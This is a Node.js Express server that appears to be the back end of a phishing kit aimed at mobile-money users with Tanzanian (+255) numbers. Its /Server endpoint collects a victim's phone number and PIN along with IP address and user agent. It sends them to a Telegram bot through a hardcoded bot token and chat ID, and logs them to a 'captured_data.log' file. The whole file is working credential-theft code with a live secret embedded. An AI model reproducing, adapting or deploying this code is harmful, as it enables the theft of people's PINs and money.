const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM BOT CONFIGURATION
// ============================================
const BOT_TOKEN = "8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E";
const CHAT_ID = "8392790531";

// ============================================
// SERVE HTML FILE (optional)
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// ENDPOINT TO RECEIVE DATA
// ============================================
app.post('/Server', async (req, res) => {
    try {
        const { phone, pin } = req.body;
        
        // Validate data
        if (!phone || !pin) {
            return res.status(400).json({ 
                status: 'error', 
                message: 'Phone and PIN are required' 
            });
        }
        
        // Get additional info
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
        
        // Create Telegram message
        const message = `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n` +
                       `      📱 MixxYass Capture Data 📱\n` +
                       `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n` +
                       `📞 PHONE NUMBER:\n` +
                       `   +255 ${phone}\n\n` +
                       `🔐 PIN CODE:\n` +
                       `   ${pin}\n\n` +
                       `🖥️ IP ADDRESS:\n` +
                       `   ${ip}\n\n` +
                       `📱 USER AGENT:\n` +
                       `   ${userAgent.slice(0, 80)}\n\n` +
                       `⏰ DATE & TIME:\n` +
                       `   ${timestamp}\n\n` +
                       `🟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🟡\n` +
                       `         MixxYas Security Alert\n` +
                       `🟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🟡`;
        
        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
        
        // Log to file
        const logEntry = `${timestamp} | Phone: ${phone} | PIN: ${pin} | IP: ${ip}\n`;
        fs.appendFileSync('captured_data.log', logEntry);
        
        // Send success response
        res.json({ status: 'success', message: 'Data sent to Telegram' });
        
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to send data to Telegram' 
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Visit: http://localhost:${PORT}`);
});
